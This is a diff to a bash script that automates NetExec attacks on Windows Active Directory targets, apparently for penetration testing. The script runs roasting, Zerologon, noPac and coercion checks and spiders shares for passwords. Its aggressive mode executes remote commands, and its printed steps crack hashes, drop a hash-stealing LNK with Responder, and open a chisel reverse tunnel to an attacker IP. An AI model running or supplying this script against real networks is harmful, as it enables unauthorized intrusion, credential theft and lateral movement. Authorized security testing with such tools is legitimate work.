@@ -13,6 +13,17 @@
 #     RDP/MSSQL enum, roasting, popular modules, vuln scans, file ops,
 #     and optionally intrusive actions with -a).
 #
+# Output is colorized to match nxc's own convention:
+#   green [+]   = valid/success           red [-]  = invalid/failure
+#   magenta     = valid creds, no session  yellow   = Pwn3d! / admin access
+# A consolidated, color-coded FINDINGS summary is printed at the end and
+# saved to <outdir>/findings.txt.
+#
+# If `unbuffer` (from the `expect` package) is installed, nxc is run
+# through a pty so it keeps emitting its own native colors even though
+# output is being piped through tee; otherwise it falls back to plain
+# text automatically (no hard dependency).
+#
 # Usage:
 #   ./nxc_enum.sh -t <target> [-u <user> (-p <pass> | -H <hash>)] [options]
 #
@@ -49,6 +60,27 @@
 #   ./nxc_enum.sh -t 10.10.10.5 -u jsmith -H <ntlm_hash> -d corp.local -a -x whoami
 
 set -uo pipefail
+
+# -------------------------------------------------------------------------
+# Colors - mirrors nxc's own output convention
+# -------------------------------------------------------------------------
+if [[ -t 1 ]]; then
+    C_RED=$'\033[0;31m';    C_GREEN=$'\033[0;32m';   C_YELLOW=$'\033[1;33m'
+    C_BLUE=$'\033[0;34m';   C_MAGENTA=$'\033[0;35m'; C_CYAN=$'\033[0;36m'
+    C_BOLD=$'\033[1m';      C_DIM=$'\033[2m';        C_RESET=$'\033[0m'
+else
+    C_RED=""; C_GREEN=""; C_YELLOW=""; C_BLUE=""; C_MAGENTA=""; C_CYAN=""
+    C_BOLD=""; C_DIM=""; C_RESET=""
+fi
+
+strip_ansi() { sed -E 's/\x1b\[[0-9;]*m//g'; }
+
+# Run nxc through a pty if `unbuffer` is available so nxc keeps emitting
+# its own colors even though stdout is being piped through tee.
+PTY_WRAP=()
+if command -v unbuffer >/dev/null 2>&1; then
+    PTY_WRAP=(unbuffer -p)
+fi
 
 TARGET=""; DOM_USER=""; PASS=""; HASH=""; DOMAIN=""
 LOCAL_AUTH=0; KERB=0; AGGRESSIVE=0; EXEC_CMD=""; SPIDER_SHARE=""
@@ -107,20 +139,121 @@ SAFE_TARGET="$(echo "$TARGET" | tr '/\\:' '_')"
 OUTDIR="${OUTDIR:-./nxc_enum_${SAFE_TARGET}_${TS}}"
 mkdir -p "$OUTDIR"
 LOG="$OUTDIR/run.log"
+FINDINGS="$OUTDIR/findings.txt"
 
-section() { echo -e "\n==================== $1 ====================" | tee -a "$LOG"; }
+# -------------------------------------------------------------------------
+# Helpers
+# -------------------------------------------------------------------------
+section() {
+    echo -e "\n${C_BOLD}${C_CYAN}==================== $1 ====================${C_RESET}"
+    echo -e "\n==================== $1 ====================" >> "$LOG"
+}
 
 run() {
     local desc="$1"; shift
-    echo -e "\n[*] $desc" | tee -a "$LOG"
-    echo "    \$ $*" | tee -a "$LOG"
-    "$@" 2>&1 | tee -a "$LOG"
+    echo -e "\n${C_BOLD}${C_BLUE}[*]${C_RESET} ${C_BOLD}$desc${C_RESET}"
+    echo -e "    ${C_DIM}\$ $*${C_RESET}"
+    {
+        echo -e "\n[*] $desc"
+        echo "    \$ $*"
+    } >> "$LOG"
+
+    if [[ ${#PTY_WRAP[@]} -gt 0 ]]; then
+        "${PTY_WRAP[@]}" "$@" > >(tee >(strip_ansi >> "$LOG")) 2>&1
+    else
+        "$@" 2>&1 | tee -a "$LOG"
+    fi
 }
 
-echo "Target      : $TARGET"                           | tee "$LOG"
-echo "Credentials : $([[ $HAVE_CREDS -eq 1 ]] && echo "$DOM_USER / ${DOMAIN:-<no domain>}" || echo "<none - unauth only>")" | tee -a "$LOG"
-echo "Aggressive  : $AGGRESSIVE"                        | tee -a "$LOG"
-echo "Start       : $(date)"                            | tee -a "$LOG"
+note() {
+    echo -e "${C_YELLOW}[i]${C_RESET} $1"
+    echo "[i] $1" >> "$LOG"
+}
+
+# Scan run.log for the interesting stuff and print a color-coded summary.
+# Must be defined before PHASE 1, since the unauth-only exit path calls it.
+print_findings() {
+    local plain_log="$OUTDIR/.run_plain.log"
+    strip_ansi < "$LOG" > "$plain_log"
+
+    : > "$FINDINGS"
+    local hit=0
+
+    section "FINDINGS"
+
+    # --- Pwn3d! / admin access -----------------------------------------
+    local pwn3d_lines
+    pwn3d_lines=$(grep -F '(Pwn3d!)' "$plain_log" || true)
+    if [[ -n "$pwn3d_lines" ]]; then
+        hit=1
+        echo -e "${C_BOLD}${C_YELLOW}[Pwn3d!] Administrative access obtained${C_RESET}"
+        echo "$pwn3d_lines" | while IFS= read -r l; do echo -e "  ${C_YELLOW}${l}${C_RESET}"; done
+        { echo "[Pwn3d!] Administrative access obtained"; echo "$pwn3d_lines" | sed 's/^/  /'; echo; } >> "$FINDINGS"
+    fi
+
+    # --- Valid logins / positive results ([+]) --------------------------
+    local plus_lines
+    plus_lines=$(grep -F '[+]' "$plain_log" || true)
+    if [[ -n "$plus_lines" ]]; then
+        hit=1
+        echo -e "\n${C_BOLD}${C_GREEN}[+] Valid access / positive results${C_RESET}"
+        echo "$plus_lines" | while IFS= read -r l; do echo -e "  ${C_GREEN}${l}${C_RESET}"; done
+        { echo "[+] Valid access / positive results"; echo "$plus_lines" | sed 's/^/  /'; echo; } >> "$FINDINGS"
+    fi
+
+    # --- Vulnerable services ---------------------------------------------
+    local vuln_lines
+    vuln_lines=$(grep -i 'VULNERABLE' "$plain_log" || true)
+    if [[ -n "$vuln_lines" ]]; then
+        hit=1
+        echo -e "\n${C_BOLD}${C_RED}[!] Vulnerable services detected${C_RESET}"
+        echo "$vuln_lines" | while IFS= read -r l; do echo -e "  ${C_RED}${l}${C_RESET}"; done
+        { echo "[!] Vulnerable services detected"; echo "$vuln_lines" | sed 's/^/  /'; echo; } >> "$FINDINGS"
+    fi
+
+    # --- SMB signing not required (relay candidates) ---------------------
+    if [[ -s "$OUTDIR/relay_list.txt" ]]; then
+        hit=1
+        echo -e "\n${C_BOLD}${C_MAGENTA}[~] Hosts without SMB signing (relay candidates)${C_RESET}"
+        while IFS= read -r l; do echo -e "  ${C_MAGENTA}${l}${C_RESET}"; done < "$OUTDIR/relay_list.txt"
+        { echo "[~] Hosts without SMB signing (relay candidates)"; sed 's/^/  /' "$OUTDIR/relay_list.txt"; echo; } >> "$FINDINGS"
+    fi
+
+    # --- RDP without NLA ---------------------------------------------------
+    local nla_lines
+    nla_lines=$(grep -F 'nla:False' "$plain_log" || true)
+    if [[ -n "$nla_lines" ]]; then
+        hit=1
+        echo -e "\n${C_BOLD}${C_MAGENTA}[~] RDP with NLA disabled (pre-auth login screenshot possible)${C_RESET}"
+        echo "$nla_lines" | while IFS= read -r l; do echo -e "  ${C_MAGENTA}${l}${C_RESET}"; done
+        { echo "[~] RDP with NLA disabled"; echo "$nla_lines" | sed 's/^/  /'; echo; } >> "$FINDINGS"
+    fi
+
+    # --- Roastable accounts recovered -------------------------------------
+    local f count
+    for f in "$OUTDIR/asreproast_unauth.out" "$OUTDIR/asreproast.out" "$OUTDIR/kerberoasting.out"; do
+        if [[ -s "$f" ]]; then
+            hit=1
+            count=$(grep -c '.' "$f")
+            echo -e "\n${C_BOLD}${C_GREEN}[+] Roastable hashes captured -> $(basename "$f") ($count hash(es))${C_RESET}"
+            echo "[+] Roastable hashes captured -> $(basename "$f") ($count hash(es))" >> "$FINDINGS"
+        fi
+    done
+
+    if [[ "$hit" -eq 0 ]]; then
+        echo -e "${C_DIM}No notable findings were pattern-matched. Review $LOG manually.${C_RESET}"
+        echo "No notable findings were pattern-matched. Review run.log manually." >> "$FINDINGS"
+    fi
+
+    rm -f "$plain_log"
+}
+
+{
+echo "Target      : $TARGET"
+echo "Credentials : $([[ $HAVE_CREDS -eq 1 ]] && echo "$DOM_USER / ${DOMAIN:-<no domain>}" || echo "<none - unauth only>")"
+echo "Aggressive  : $AGGRESSIVE"
+echo "Start       : $(date)"
+} | tee "$LOG"
 
 # =========================================================================
 # PHASE 1: UNAUTHENTICATED RECON (always runs)
@@ -170,12 +303,12 @@ if [[ -n "$USERFILE" && -f "$USERFILE" ]]; then
     run "AS-REP roast using $USERFILE (no creds needed)" \
         nxc ldap "$TARGET" -u "$USERFILE" -p '' --asreproast "$OUTDIR/asreproast_unauth.out"
 else
-    echo "[i] No username file found for unauth AS-REP roast (pass -U users.txt). Skipping." | tee -a "$LOG"
+    note "No username file found for unauth AS-REP roast (pass -U users.txt). Skipping."
 fi
 
-run "Check for Zerologon (CVE-2020-1472)"    nxc smb "$TARGET" -M zerologon
-run "Check for PetitPotam coercion"          nxc smb "$TARGET" -M petitpotam
-run "Check for MS17-010 / EternalBlue"       nxc smb "$TARGET" -M ms17-010
+run "Check for Zerologon (CVE-2020-1472)"               nxc smb "$TARGET" -M zerologon
+run "Check for coercion vulnerabilities (coerce_plus)"  nxc smb "$TARGET" -M coerce_plus
+run "Check for MS17-010 / EternalBlue"                  nxc smb "$TARGET" -M ms17-010
 
 run "Screenshot RDP login prompt if NLA is disabled" \
     nxc rdp "$TARGET" --nla-screenshot
@@ -185,10 +318,14 @@ run "Screenshot RDP login prompt if NLA is disabled" \
 # =========================================================================
 if [[ "$HAVE_CREDS" -eq 0 ]]; then
     section "PHASE 2: Authenticated Enumeration - SKIPPED"
-    echo "[i] No credentials supplied. Re-run with -u and -p/-H once you have a foothold." | tee -a "$LOG"
+    note "No credentials supplied. Re-run with -u and -p/-H once you have a foothold."
+    print_findings
     section "Summary"
-    echo "Finished: $(date)" | tee -a "$LOG"
-    echo "Full log and artifacts saved in: $OUTDIR" | tee -a "$LOG"
+    {
+    echo "Finished: $(date)"
+    echo "Full log and artifacts saved in: $OUTDIR"
+    echo "Findings summary saved to: $FINDINGS"
+    } | tee -a "$LOG"
     exit 0
 fi
 
@@ -227,9 +364,12 @@ run "AS-REP roast (no preauth accounts)" \
 run "Kerberoast (SPN accounts)" \
     nxc ldap "$TARGET" "${CRED_FLAGS[@]}" --kerberoasting "$OUTDIR/kerberoasting.out"
 
-echo -e "\n[i] Crack offline with hashcat:" | tee -a "$LOG"
-echo "    hashcat -m 18200 $OUTDIR/asreproast.out /usr/share/wordlists/rockyou.txt --force"   | tee -a "$LOG"
-echo "    hashcat -m 13100 $OUTDIR/kerberoasting.out /usr/share/wordlists/rockyou.txt --force" | tee -a "$LOG"
+{
+echo
+echo "[i] Crack offline with hashcat:"
+echo "    hashcat -m 18200 $OUTDIR/asreproast.out /usr/share/wordlists/rockyou.txt --force"
+echo "    hashcat -m 13100 $OUTDIR/kerberoasting.out /usr/share/wordlists/rockyou.txt --force"
+} | tee -a "$LOG"
 
 # --- RDP Enumeration ---
 section "RDP Enumeration"
@@ -256,7 +396,7 @@ run "KeePass config discovery"                     nxc smb "$TARGET"  "${CRED_FL
 # --- Vulnerability Scan Modules ---
 section "Vulnerability Scan Modules"
 run "Zerologon (CVE-2020-1472)"                   nxc smb "$TARGET" "${CRED_FLAGS[@]}" -M zerologon
-run "PetitPotam coercion check"                   nxc smb "$TARGET" "${CRED_FLAGS[@]}" -M petitpotam
+run "Coercion check (coerce_plus)"                nxc smb "$TARGET" "${CRED_FLAGS[@]}" -M coerce_plus
 run "MS17-010 / EternalBlue"                      nxc smb "$TARGET" "${CRED_FLAGS[@]}" -M ms17-010
 run "noPac (CVE-2021-42278 / 42287)"              nxc smb "$TARGET" "${CRED_FLAGS[@]}" -M nopac
 run "DFSCoerce check"                             nxc smb "$TARGET" "${CRED_FLAGS[@]}" -M dfscoerce
@@ -270,7 +410,7 @@ if [[ -n "$SPIDER_SHARE" ]]; then
     run "Spider share '$SPIDER_SHARE' with content search" \
         nxc smb "$TARGET" "${CRED_FLAGS[@]}" --spider "$SPIDER_SHARE" --pattern pass --content
 else
-    echo "[i] No -s SHARE given - skipping targeted spider. Running spider_plus across all shares instead." | tee -a "$LOG"
+    note "No -s SHARE given - skipping targeted spider. Running spider_plus across all shares instead."
 fi
 run "Catalog all files across all shares (spider_plus, read-only)" \
     nxc smb "$TARGET" "${CRED_FLAGS[@]}" -M spider_plus -o EXCLUDE_DIR=IPC\$,print\$,NETLOGON,SYSVOL
@@ -294,31 +434,38 @@ if [[ "$AGGRESSIVE" -eq 1 ]]; then
         run "Execute Powershell command via SMB" nxc smb "$TARGET"   "${CRED_FLAGS[@]}" -X "$EXEC_CMD"
         run "Execute command via WinRM"          nxc winrm "$TARGET" "${CRED_FLAGS[@]}" -x "$EXEC_CMD"
     else
-        echo "[i] No -x CMD supplied - skipping command execution." | tee -a "$LOG"
+        note "No -x CMD supplied - skipping command execution."
     fi
 
     section "RDP Enable/Disable (AGGRESSIVE)"
-    echo "[i] Skipped by default. To enable RDP on the target, run:" | tee -a "$LOG"
+    note "Skipped by default. To enable RDP on the target, run:"
     echo "    nxc smb $TARGET ${CRED_FLAGS[*]} -M rdp -o ACTION=enable" | tee -a "$LOG"
 
     section "Hash Stealing / Coercion Drops (AGGRESSIVE - leaves artifacts on target)"
-    echo "[i] Not auto-executed; requires your attack IP and a writable share." | tee -a "$LOG"
-    echo "    1) Start a listener first:  sudo responder -I tun0" | tee -a "$LOG"
-    echo "    2) Drop a malicious LNK:    nxc smb $TARGET ${CRED_FLAGS[*]} -M slinky -o SERVER=<YOUR_IP> NAME=<lnk_name>" | tee -a "$LOG"
-    echo "    3) Clean up afterwards:     nxc smb $TARGET ${CRED_FLAGS[*]} -M slinky -o SERVER=<YOUR_IP> NAME=<lnk_name> CLEAN=YES" | tee -a "$LOG"
+    note "Not auto-executed; requires your attack IP and a writable share."
+    {
+    echo "    1) Start a listener first:  sudo responder -I tun0"
+    echo "    2) Drop a malicious LNK:    nxc smb $TARGET ${CRED_FLAGS[*]} -M slinky -o SERVER=<YOUR_IP> NAME=<lnk_name>"
+    echo "    3) Clean up afterwards:     nxc smb $TARGET ${CRED_FLAGS[*]} -M slinky -o SERVER=<YOUR_IP> NAME=<lnk_name> CLEAN=YES"
+    } | tee -a "$LOG"
 
 else
     section "Aggressive Modules Skipped"
-    echo "[i] Re-run with -a to include secret dumps, command execution, and hash-stealing drops." | tee -a "$LOG"
+    note "Re-run with -a to include secret dumps, command execution, and hash-stealing drops."
 fi
+
+print_findings
 
 # -----------------------------------------------------------------------
 # Wrap up
 # -----------------------------------------------------------------------
 section "Summary"
-echo "Finished: $(date)"                        | tee -a "$LOG"
-echo "Full log and artifacts saved in: $OUTDIR"  | tee -a "$LOG"
+{
+echo "Finished: $(date)"
+echo "Full log and artifacts saved in: $OUTDIR"
+echo "Findings summary saved to: $FINDINGS"
 echo
 echo "Pivoting reminder (manual, not run automatically):"
 echo "  chisel server --reverse                                   (on your attack host)"
 echo "  nxc smb $TARGET ${CRED_FLAGS[*]} -x \"C:\\Windows\\Temp\\chisel.exe client <YOUR_IP>:8080 R:socks\""
+} | tee -a "$LOG"
